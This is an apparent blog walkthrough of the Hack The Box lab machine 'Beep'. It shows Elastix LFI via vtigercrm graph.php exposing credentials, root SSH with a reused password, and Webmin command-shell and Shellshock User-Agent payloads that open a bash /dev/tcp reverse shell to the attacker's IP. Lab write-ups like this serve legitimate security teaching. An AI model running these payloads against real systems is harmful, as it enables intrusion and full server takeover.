## Initial Thoughts Based on Nmap Scan

Based on the Nmap scans, the ports that seemed most intriguing is of course ports `80, 443, and 10000.`  The reason for this is looking over the other ports, quite a few of them won't be of much use without credentials or some sort of lead as to why they are being used. Seeing that there are three web servers being hosted on this machine, there might be some information as to why all these ports are open once we begin doing enumeration of ports `80, 443, and 10000.`

## `HTTP - 80` Enumeration

There isn't really much enumeration that went into HTTP. The clear indicator for this is observing the `Initial Nmap TCP scan` which showed `http-title: Did not follow redirect to https://10.10.10.7/`. Seeing this, there must be some sort of redirect that was occurring when navigating to `http://10.10.10.7`. Navigating to the page, there was a redirection to `https://10.10.10.7`. So enumerating port `443` will be the next option.

## `HTTPS - 443` Enumeration 

Looking at port 443, we are presented with a web page that is hosting `Elastix`. Doing some research on Elastix, it is a Linux distribution that integrates tools available for Asterisk-based Private Branch Exchanges ("PBX") into a single interface. A PBX is a business telephone system used within a company or organization to manage incoming an outgoing phone calls. This makes a lot of sense since the name of this box is "Beep". Since we have a web server being hosted on this box, it is always good to run some scans in the background while we do manual enumeration. I'm going to run a gobuster to directory brute force this URL and find more directories to explore.

```shell
gobuster dir -u https://10.10.10.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt,.php -t 50 -o gobuster-443 -k 
```

Going over the flags, `dir -u` specifies what URL you want to do the scan against, `-w` is the flag to specify a wordlist, `-x` is the file extensions you want to look for (I went ahead and looked for `.txt` and `.php`. ), `-t` designates how many threads you want to use, `-o` is used to output a file with a filename, and `-k` will disable certificate checks since we are enumerating port 443.

&nbsp

Early on in the scans I find a `/admin` directory. Upon entering it in, I am presented with HTTP Basic Authentication prompting me to enter in a username and password. I don't have one right now so I just enter in something simple like `admin:admin` and see what happens. Nothing happens. I go ahead and do a few more sad attempts to try to get access and nothing. I hit `cancel` and it redirects me to the `/admin/config.php` page which looks like this:

</p>


Looking around on this page we spot something useful which is a version number to this service! We see `FreePBX 2.8.1.4`. We can do a quick Google search to see if there are any known exploits to this, but for now, I'm going to keep that in mind for later. Something else that may be useful to think about is since we know the version of `FreePBX`, we can see when this version came out and take a guess what version `Elastix` is as well since they seem to be working together. Google searching `FreePBX 2.8.1.4 release` shows some posts from around 2011 and 2014. So we might have an idea that Elastix is about that old as well. Looking up exploits on Elastix using `searchsploit`, which is a command line search tool for Exploit-DB which has tons of exploits publicly available.

```shell
searchsploit Elastix
```

```

Looking at this output, the first three aren't of much interest to us. The reason why is cross-site scripting ("XSS") typically deals with client-side attacks. Since we aren't attacking any clients, it is not super useful to be looking into this. The ones that definitely look more intriguing are the last four. Let's start at the first one which says `'graph.php' Local File Inclusion`. We can see some proof of concept by using this command:

```bash
searchsploit -x php/webapps/37637.pl
```

Looking on the description at the top, it reads: `Elastix is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input. An attacker can exploit this vulnerability to view files and execute local scripts in the context of the web server process. This may aid in further attacks. Elastix 2.2.0 is vulnerable; other versions may also be affected.` Local file inclusion ("LFI") is an attack to trick a web application to expose files on the web server. Typically this is done when web server make a direct call to a file with a parameter such as https://example.com/`?file=` This `?file=` parameter is looking for some sort of file to grab. Typically this could be something non-malicious such as https://example.com/?file=index.html. Nothing malicious right? Well what if someone did this: https://example.com/`?file=../../../../../../../../../../etc/passwd`. What is this doing? Well thinking back to how we go back directories we use a `..` to go back a directory. And if we want to go back multiple directories we do `../../`.  For this example, the goal is to read the `/etc/passwd` file. The reason why we need so many `../../../` is because we do not know exactly where this server is located within the file hierarchy. Is it in `/var/www/html`? Is it somewhere else? We have no idea. But what we do know is that regardless of how many `../../../` we put, we most likely will hit the `/` directory. From there, we can go to `/etc/passwd` with no issue what so ever. So let's see if Elastix is vulnerable to LFI. Also as a side note, I did some Google searching and found that the release date was roughly around the same time of the FreePBX just off of observation. 

### `HTTPS - 443` Exploitation | Local File Inclusion ("LFI")

On the proof of concept found from `searchsploit`, we can see they are going to this directory

```apl
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

The first directory is `/vtigercrm`. Just to make sure it's there I navigated to it and found this:

<p align="center">
  <img src="{{ site.github.url }}/images/htb/beep/image-20210526204354450.png" />
</p>


Great! So it's there. Let's see if local file inclusion works now. I'm going to go ahead and type the following into the browser:

```apl
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

And it works!

<p align="center">
  <img src="{{ site.github.url }}/images/htb/beep/image-20210526204455057.png" />
</p>


This output is a bit ugly so we can make this cleaner by just viewing the page source. We can just right click the page and hit `View Page Source` or you can do `Ctrl+U` as a shortcut to get there.

<p align="center">
  <img src="{{ site.github.url }}/images/htb/beep/image-20210526204544307.png" />
</p>

This is much better now. The first thing I notice are we have credentials! There's a lot of them and we should always note these down. Something also interesting is that this `jEhdIekWmdjE` password is being reused a lot. Maybe this can be used else where? I'm going to try to `SSH` into the `root` user with these credentials and see if maybe it works.

## Root Access via SSH + Credentials Found Through LFI

```bash
ssh root@10.10.10.7
```

When doing this, I get the following output: `Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1`

&nbsp

Doing a quick Google search, if you use `ssh -oKexAlgorithms=+diffie-hellman-group1-sha1` in front of the IP address, it will work. This is apparently an issue due to clients wanting to authenticate with old algorithms so we need to tell SSH to use this to authenticate with the SSH server.

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7
root@10.10.10.7's password: 
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

And surprisingly we got access to the root user! 

## Gaining Root Access via Webmin

If you can recall, on the Nmap scan on port 10000 was `Webmin`.

```
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
```

Navigating to this web server presents the following:

<p align="center">
  <img src="{{ site.github.url }}/images/htb/beep/image-20210526210918877.png" />
</p>


Just a simple login page. Let's try to use the credentials we got from the LFI exploit on Elastix. The password that seemed to be reused a lot was the `jEhdIekWmdjE` password. Let's try that with `root:jEhdIekWmdjE` as the username and password. And of course, we get in.

Looking around the page I find under `Other` there is a `Command Shell` category. Sounds pretty enticing. Navigating to this shows the following page:

Seems pretty self explanatory. Let's try some simple commands like `ls` an `id`.

Cool! We definitely have code execution. Something I always like doing just as a due diligence type of mindset is making sure we can ping our box from this server. The reason for this is to ensure we are able to actually see if we are able to connect from the box to ourselves when we want to do something like a reverse shell. The way to do this is to just type into the text field `ping $ip_address`. Before you hit `execute command`, make sure you have `tcpdump` running in the background. `tcpdump` is just a data-network packet analyzer. It will show us packets that are being sent to it and we can specify a particular interface for it to capture packets from. We're going to use the `tun0` interface since this is our VPNs network interface. We are also going to type `icmp` after it to only capture pings since `icmp` is the network protocol used to ping. Go ahead and execute the command once your `tcpdump` is set up.

```
tcpdump -i tun0 icmp
```

```

And we can see we are getting pings from `10.10.10.7`. This is exactly what we want to see! Now let's go ahead and try to get a reverse shell from this. I like to use the [Reverse Shell Cheatsheet](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwjx5umDgenwAhVYsp4KHR2GAHYQjBAwAXoECAgQAQ&url=https%3A%2F%2Fgithub.com%2Fswisskyrepo%2FPayloadsAllTheThings%2Fblob%2Fmaster%2FMethodology%2520and%2520Resources%2FReverse%2520Shell%2520Cheatsheet.md&usg=AOvVaw1muzxC_RH5YpYkyhxzEDJz) from the PayloadsAllTheThings GitHub repo. I'm going to be looking for a `Bash TCP` reverse shell since most likely they have `bash` on there and we are going to want it through the `TCP` protocol. This is what the payload looks like: `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`. We need to adjust a few things. Firstly is the IP address, we need to change `10.0.0.1` to our VPN IP address, secondly is the `4242`. We could leave it here or change it because this is just going to be the port we are listening on through our `netcat` listener. After changing that, I got the following:

```
bash -i >& /dev/tcp/10.10.14.36/443 0>&1
```

The reason why I use `443` as the port is because sometimes a machine may filter out any other port that is not the ports being hosted. Of course you're not a hacker if you don't use `port 1337` for your reverse shells (joking.. slightly.. maybe..) but in all seriousness using ports like this may help a lot in the future as some ports may be filtered. Now, I'm going to go ahead and set up my netcat listener to port 443 and hit `execute command` on the web server.

```
nc -lvnp 443
```

<p align="center">

</p>


```
listening on [any] 443 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.7] 57160
bash: no job control in this shell
[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

And we are the root user again! Very very cool how there are multiple paths to compromise this box. Knowing that, let's try one more way of exploiting this box.

## Gaining Root Access via Shellshock Vulnerability

After going back to the login page of Webmin I noticed that after sending a POST request to login, it is being sent to `/session_login_cgi`. If you ever see a `.cgi` file, it is time to look into Shellshock. "Shellshock is a security bug causing Bash to execute commands from environment variables unintentionally. In other words if exploited the vulnerability allows the attacker to remotely issue commands on the server, also known as remote code execution. Even though Bash is not an internet-facing service, many internet and network services such as web servers use environment variables to communicate with the server's operating system"[(NetSparker)](https://www.netsparker.com/blog/web-security/cve-2014-6271-shellshock-bash-vulnerability-scan/). The Shellshock exploit uses the string `() { :; };[cmd]` replacing the `User-Agent` HTTP header. All you need to do is replace whatever was in the `User-Agent` HTTP header, and add the `() { :; };[cmd]` string as well as replacing the `[cmd]` with an actual command. For me, I went ahead and did a `;sleep 10` command. Doing a `;sleep 10` command is a great way to see if we have command execution, especially if we were trying to test it blind (more on that on another blog post in the future most likely =]). The way we can tell this is working is that this request should take 10 secondish to respond back to us. This is because we are making it `sleep` for 10 seconds, then send the request to us. Looking at the bottom right of Burp Suite, we can see it took `11,300` millis, so roughly 11 seconds. This means we most likely have command execution! Let's go ahead and get a shell.

</p>


Using the previous bash TCP reverse shell we got from PayloadsAllTheThings, we can use this for this Shellshock exploit as well. My User-Agent header looks like the following:

```
User-Agent: () { :; };bash -i >& /dev/tcp/10.10.14.36/443 0>&1
```

Sending this through Burp Suite and having a netcat listener on port 443 get's me another shell!

```
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.7] 41640
bash: no job control in this shell
[root@beep webmin]# id
uid=0(root) gid=0(root)
```

This box was tons of fun to do as there were many ways to exploit it. After finishing this blog post, I was reading into a few other blogs and saw there are a few other ways to pwn this box. I'd highly recommend looking into the other ways you can exploit this box as well if you are interested!
